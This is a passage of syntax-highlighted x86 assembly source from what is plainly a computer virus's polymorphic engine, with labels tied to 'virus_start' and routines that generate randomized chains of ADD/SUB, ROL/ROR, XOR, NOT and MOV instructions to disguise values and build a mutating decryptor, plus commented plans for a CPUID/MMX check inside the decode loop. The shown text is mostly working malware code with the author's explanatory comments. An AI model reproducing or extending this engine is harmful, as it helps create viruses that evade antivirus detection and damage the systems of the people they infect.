    </span><span class="sc5">__copro_gm_ledi</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_back</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">__copro_gm_okay</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">           </span><span class="sc1">;qword ptr ...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; now, we must test if EDX don't come under &lt;compare_buffer&gt;</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">compare_index</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">__copro_gm_test</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__copro_gm_finish</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">compare_buffer</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">*</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">80000000h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__copro_gm_plus</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,-</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">__copro_gm_nextest</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__copro_get_mem</span><span class="sc0">
    </span><span class="sc5">__copro_gm_plus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">__copro_get_mem</span><span class="sc0">
    </span><span class="sc5">__copro_gm_nextest</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__copro_gm_test</span><span class="sc0">
    </span><span class="sc5">__copro_gm_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to fix delta for copro operations ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;If we generated offset of free memory (by __copro_get_mem)</span><span class="sc0">
        </span><span class="sc1">;then it's more then time to use delta.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;input:    EBX = offset to reg</span><span class="sc0">
</span><span class="sc5">__copro_fix_delta</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gl_index_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to crypt a destination value ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;   ÀÄÄÄÄÄÄÄÄÄ sado-maso function ÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function is for crypt a real value which we want to</span><span class="sc0">
        </span><span class="sc1">;hide. I use only base-reg (eax,edi...) because If I would</span><span class="sc0">
        </span><span class="sc1">;like to introduce the coprocessor I'd have to use FILD and</span><span class="sc0">
        </span><span class="sc1">;FIST instruction: FILD qword ptr [edi], where EDI I wanted</span><span class="sc0">
        </span><span class="sc1">;generate. At first I generate code for encode a destination</span><span class="sc0">
        </span><span class="sc1">;value and I find out a crypt value. During encoding I save</span><span class="sc0">
        </span><span class="sc1">;a opposite instruction to stack (add &lt;=&gt; sub). I could not</span><span class="sc0">
        </span><span class="sc1">;to save decode instructions into a special buffer because</span><span class="sc0">
        </span><span class="sc1">;I didn't know a real size - the stack is better for this.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;input:       EAX=destination value</span><span class="sc0">
        </span><span class="sc1">;          BL=destionation register (not in BCD)</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;used instructions: ADD opposite SUB and on the contrary</span><span class="sc0">
        </span><span class="sc1">;           ROL opposite ROR</span><span class="sc0">
        </span><span class="sc1">;           XOR reg &lt;==&gt; XOR reg</span><span class="sc0">
        </span><span class="sc1">;           NOT reg &lt;==&gt; NOT reg</span><span class="sc0">
        </span><span class="sc1">;           MOV reg1,reg2 &lt;==&gt; MOV reg2,reg1</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;do you have anything else ?</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;and now... example:</span><span class="sc0">
        </span><span class="sc1">;   * I want to generate number 0x402CC1 to EDX register</span><span class="sc0">
        </span><span class="sc1">;           MOV   ESI, 1985FDD6</span><span class="sc0">
        </span><span class="sc1">;           ROL   ESI, BB</span><span class="sc0">
        </span><span class="sc1">;           MOV   EAX, ESI</span><span class="sc0">
        </span><span class="sc1">;           NOT   EAX</span><span class="sc0">
        </span><span class="sc1">;           MOV   EDX, EAX</span><span class="sc0">
        </span><span class="sc1">;           SUB   EDX, 4FF3A350  -&gt;EDX = 0x402CC1</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;This is only example but reality it other... better !!!</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">actual_reg</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;where we've our number which we're generating</span><span class="sc0">
        </span><span class="sc5">future_reg</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;our destination register</span><span class="sc0">
        </span><span class="sc5">actual_instr</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;actual instruction in generate</span><span class="sc0">
        </span><span class="sc5">old_place</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;where's start crypt value</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ppe_crypt_value</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;save destination value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">old_place</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">actual_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">future_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">

        </span><span class="sc1">; save destination value to destination reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;select destination reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">               </span><span class="sc1">;save destination value</span><span class="sc0">

        </span><span class="sc1">; how many instruction we'll use</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000007h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">actual_instr</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">       </span><span class="sc1">;flag to stack</span><span class="sc0">
    </span><span class="sc5">__cv_next_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000003h</span><span class="sc0">       </span><span class="sc1">;may I change register ?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__cv_continue</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">   </span><span class="sc1">;i want a free register</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08Bh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;my future reg32</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">actual_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cv_next_loop</span><span class="sc0">      </span><span class="sc1">;blah - mov ecx,ecx ??</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">actual_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">               </span><span class="sc1">;finish but now i must create opposite for decode</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">actual_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">actual_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08Bh</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">;ax = decode mov</span><span class="sc0">

    </span><span class="sc5">__cv_continue</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">end_num_code</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_num_code</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">   </span><span class="sc1">;select operation</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_num_code</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">               </span><span class="sc1">;load where we have encode instruction</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">               </span><span class="sc1">;AH = base_reg, AL = id_operation</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">actual_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">;save because of separate actual_reg</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">               </span><span class="sc1">;imm(X) = 3rd_number * 8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">;now, we must generate imm</span><span class="sc0">
    </span><span class="sc5">__cv_generate_imm</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc1">;imm32 = (add,sub) reg32,imm32</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">           </span><span class="sc1">;imm8  = (rol,ror) reg32,imm8</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cv_opposite_code</span><span class="sc0">  </span><span class="sc1">;imm0  = not reg32</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">           </span><span class="sc1">;save rnd number to EBX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cv_generate_imm</span><span class="sc0">

    </span><span class="sc5">__cv_opposite_code</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">;ax = imm(X)</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">;ch = reg32, cl = encode instruction</span><span class="sc0">
    </span><span class="sc5">__cv_oc_generate_imm</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;is it imm0 ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cv_oc_imm_ok</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">         </span><span class="sc1">;save imm to stack</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">           </span><span class="sc1">;next number in imm</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cv_oc_generate_imm</span><span class="sc0">

    </span><span class="sc5">__cv_oc_imm_ok</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;esi = start of encode instruction</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">               </span><span class="sc1">;AL = opposite instruction (add &lt;=&gt; sub)</span><span class="sc0">
        </span><span class="sc6">movsx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">;is it previous or next instruction ?</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;esi = decode instruction</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">               </span><span class="sc1">;al = (en/de)code instruction</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">00000111b</span><span class="sc0">        </span><span class="sc1">;separate reg only</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">           </span><span class="sc1">;change register</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">;save encode instruction to stack</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">actual_instr</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__cv_next_loop</span><span class="sc0">

        </span><span class="sc1">;now, we must find out the crypt value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C08Bh</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">actual_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">               </span><span class="sc1">;save destination value to EAX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;ret = out of call</span><span class="sc0">

        </span><span class="sc1">;to find out crypt value we must call decode function</span><span class="sc0">
        </span><span class="sc1">;output:    eax = crypt value</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">old_place</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.access_eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">

        </span><span class="sc1">;save into last_reg our crypt value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">old_place</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">actual_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc1">;now, we must write decode instructions to old EDI</span><span class="sc0">
    </span><span class="sc5">__cv_oc_out_of_stack</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc2">12345678h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cv_oc_finish</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cv_oc_out_of_stack</span><span class="sc0">
    </span><span class="sc5">__cv_oc_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;flag from stack</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to put CPUID and MMX test to poly-decode loop ÃÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ sado-maso function ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function is necessary for detect if computer supports</span><span class="sc0">
        </span><span class="sc1">;MMX instructions. To detect we must use CPUID instruction</span><span class="sc0">
        </span><span class="sc1">;(see below). And test flag from EDX output parameter. But</span><span class="sc0">
        </span><span class="sc1">;no every computer supports CPUID instruction. We can find</span><span class="sc0">
        </span><span class="sc1">;out it if we test 21st bit in EFLAGS. I think this function</span><span class="sc0">
        </span><span class="sc1">;is very difficult to understand although I've used a lot</span><span class="sc0">
        </span><span class="sc1">;of comments. Now I show you scheme (only one part):</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  PUSHFD</span><span class="sc0">
        </span><span class="sc1">;  POP main_reg32</span><span class="sc0">
        </span><span class="sc1">;  a) AND, OR</span><span class="sc0">
        </span><span class="sc1">;   GEN 1 shl 21 to reg32</span><span class="sc0">
        </span><span class="sc1">;   a) OR  main_reg32, reg32  a) OR  main_reg32, 1 shl 21</span><span class="sc0">
        </span><span class="sc1">;   b) ADD main_reg32, reg32  b) ADD main_reg32, 1 shl 21</span><span class="sc0">
        </span><span class="sc1">;  b) BTS, (BTC - hmmm, It's not supports here - preferably)</span><span class="sc0">
        </span><span class="sc1">;   GEN 21 to reg32 (why 21 ? see below -CPUID-)</span><span class="sc0">
        </span><span class="sc1">;   a) (BTS) main_reg32, reg32</span><span class="sc0">
        </span><span class="sc1">;   b) (BTS) main_reg32, 21 (21 won't in reg32)</span><span class="sc0">
        </span><span class="sc1">;  ...</span><span class="sc0">
        </span><span class="sc1">;  this is only scheme of part one BUT reality is better !!!</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;What's happend if CPUID isn't supported ?</span><span class="sc0">
